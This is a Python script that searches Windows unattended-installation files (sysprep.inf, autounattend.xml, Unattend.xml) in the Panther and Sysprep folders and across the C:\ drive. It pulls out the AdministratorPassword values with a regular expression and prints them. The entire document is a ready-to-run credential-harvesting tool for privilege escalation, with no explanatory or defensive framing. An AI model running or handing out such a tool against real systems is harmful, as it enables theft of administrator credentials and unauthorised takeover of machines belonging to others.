import os
import re

paths_to_check = [
    r"C:\Windows\Panther",
    r"C:\Windows\System32\Sysprep",
    r"C:\\"
]

target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]

password_regex = re.compile(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", re.DOTALL)

def find_files():
    found_files = []
    for path in paths_to_check:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file in target_files:
                    full_path = os.path.join(root, file)
                    found_files.append(full_path)
    return found_files

def extract_passwords(files):
    passwords = []
    for file in files:
        try:
            with open(file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                matches = password_regex.findall(content)
                passwords.extend(matches)
        except Exception as e:
            print(f"[!] Could not read {file}: {e}")
    return passwords

def main():
    print("[*] Searching for unattended install files...")
    files = find_files()
    if not files:
        print("[-] No unattended files found.")
        return
    
    print(f"[+] Found {len(files)} file(s):")
    for f in files:
        print(f" - {f}")

    print("\n[*] Extracting passwords...")
    passwords = extract_passwords(files)
    if not passwords:
        print("[-] No passwords found.")
    else:
        print("[+] Password(s) extracted:")
        for p in passwords:
            print(f" - {p}")

if __name__ == "__main__":
    main()
